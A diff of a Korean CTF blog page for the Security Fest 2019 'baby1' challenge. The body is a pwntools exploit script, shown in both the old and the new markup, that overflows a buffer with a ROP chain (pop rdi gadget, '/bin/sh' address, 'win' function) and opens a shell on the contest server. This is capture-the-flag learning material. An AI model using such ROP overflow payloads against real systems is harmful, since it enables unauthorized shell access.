@@ -20,18 +20,18 @@
     
         <meta name="keywords" content="CTF">
     
-    <meta name="description" content="Baby2 from pwn import * #r = process(&apos;./baby1&apos;) r = remote(&apos;baby-01.pwn.beer&apos;, 10001) e = ELF(&apos;./baby1&apos;) binsh = e.search(&quot;/bin/sh&quot;).next() pr = 0x0000000000400793 # pop rdi; ret   ru = lambda a: r.r">
+    <meta name="description" content="Baby2 12345678910111213141516171819from pwn import *#r = process(&apos;./baby1&apos;)r = remote(&apos;baby-01.pwn.beer&apos;, 10001)e = ELF(&apos;./baby1&apos;)binsh = e.search(&quot;/bin/sh&quot;).next()pr = 0x0000000000400793 # pop rdi;">
 <meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Security Fest 2019 baby1">
 <meta property="og:url" content="http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby1/index.html">
 <meta property="og:site_name" content="j0n9hyun">
-<meta property="og:description" content="Baby2 from pwn import * #r = process(&apos;./baby1&apos;) r = remote(&apos;baby-01.pwn.beer&apos;, 10001) e = ELF(&apos;./baby1&apos;) binsh = e.search(&quot;/bin/sh&quot;).next() pr = 0x0000000000400793 # pop rdi; ret   ru = lambda a: r.r">
+<meta property="og:description" content="Baby2 12345678910111213141516171819from pwn import *#r = process(&apos;./baby1&apos;)r = remote(&apos;baby-01.pwn.beer&apos;, 10001)e = ELF(&apos;./baby1&apos;)binsh = e.search(&quot;/bin/sh&quot;).next()pr = 0x0000000000400793 # pop rdi;">
 <meta property="og:locale" content="ko">
 <meta property="og:updated_time" content="2019-05-27T14:43:16.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Security Fest 2019 baby1">
-<meta name="twitter:description" content="Baby2 from pwn import * #r = process(&apos;./baby1&apos;) r = remote(&apos;baby-01.pwn.beer&apos;, 10001) e = ELF(&apos;./baby1&apos;) binsh = e.search(&quot;/bin/sh&quot;).next() pr = 0x0000000000400793 # pop rdi; ret   ru = lambda a: r.r">
+<meta name="twitter:description" content="Baby2 12345678910111213141516171819from pwn import *#r = process(&apos;./baby1&apos;)r = remote(&apos;baby-01.pwn.beer&apos;, 10001)e = ELF(&apos;./baby1&apos;)binsh = e.search(&quot;/bin/sh&quot;).next()pr = 0x0000000000400793 # pop rdi;">
     
 	<link rel="canonical" href="http://j0n9hyun.github.io/2019/05/24/security-fest-2019-baby1/">
 
@@ -62,7 +62,7 @@
     
 
 
-<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+</head>
 </html>
 <body>
     <div id="wrap">
@@ -186,26 +186,7 @@
         
         <div class="article-entry" itemprop="articleBody">
             <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="baby2"><a class="markdownIt-Anchor" href="#baby2"></a> Baby2</h3>
-<pre class="highlight"><code class="python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-<span class="hljs-comment">#r = process('./baby1')</span>
-r = remote(<span class="hljs-string">'baby-01.pwn.beer'</span>, <span class="hljs-number">10001</span>)
-e = ELF(<span class="hljs-string">'./baby1'</span>)
-binsh = e.search(<span class="hljs-string">"/bin/sh"</span>).next()
-pr = <span class="hljs-number">0x0000000000400793</span> <span class="hljs-comment"># pop rdi; ret </span>
-
-ru = <span class="hljs-keyword">lambda</span> a: r.recvuntil(a)
-sl = <span class="hljs-keyword">lambda</span> a: r.sendline(a)
-sla = <span class="hljs-keyword">lambda</span> a, b: r.sendlineafter(a, b)
-ex = <span class="hljs-keyword">lambda</span> : r.interactive()
-
-p = <span class="hljs-string">"A"</span>*<span class="hljs-number">0x18</span>
-p += p64(pr)
-p += p64(binsh)
-p += p64(e.symbols[<span class="hljs-string">'win'</span>])
-sl(p)
-ru(<span class="hljs-string">"input: "</span>)
-ex();
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = process('./baby1')</span></span><br><span class="line">r = remote(<span class="string">'baby-01.pwn.beer'</span>, <span class="number">10001</span>)</span><br><span class="line">e = ELF(<span class="string">'./baby1'</span>)</span><br><span class="line">binsh = e.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">pr = <span class="number">0x0000000000400793</span> <span class="comment"># pop rdi; ret </span></span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: r.recvuntil(a)</span><br><span class="line">sl = <span class="keyword">lambda</span> a: r.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b: r.sendlineafter(a, b)</span><br><span class="line">ex = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line"></span><br><span class="line">p = <span class="string">"A"</span>*<span class="number">0x18</span></span><br><span class="line">p += p64(pr)</span><br><span class="line">p += p64(binsh)</span><br><span class="line">p += p64(e.symbols[<span class="string">'win'</span>])</span><br><span class="line">sl(p)</span><br><span class="line">ru(<span class="string">"input: "</span>)</span><br><span class="line">ex();</span><br></pre></td></tr></table></figure>
 <center><small>[Exploit Code]</small></center> <br>
 
         </div>
@@ -214,7 +195,7 @@ ex();
 
 
 
-    <a data-url="http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby1/" data-id="ck00o3nqx001mz7fptxjge73f" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
+    <a data-url="http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby1/" data-id="ck00obmka001mhifpqxvruvy9" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
 <script>
     (function ($) {
         $('body').on('click', function() {
@@ -293,15 +274,8 @@ ex();
         "dateModified": "2019-05-27",
         "url": "http://j0n9hyun.github.io/2019/05/24/Security-Fest-2019-baby1/",
         "description": " Baby2
-from pwn import *
-#r = process('./baby1')
-r = remote('baby-01.pwn.beer', 10001)
-e = ELF('./baby1')
-binsh = e.search("/bin/sh").next()
-pr = 0x0000000000400793 # pop rdi; ret 
-
-ru = lambda a: r.r"
-        "wordCount": 75
+12345678910111213141516171819from pwn import *#r = process('./baby1')r = remote('baby-01.pwn.beer', 10001)e = ELF('./baby1')binsh = e.search("/bin/sh").next()pr = 0x0000000000400793 # pop rdi; "
+        "wordCount": 115
     }
 </script>
 
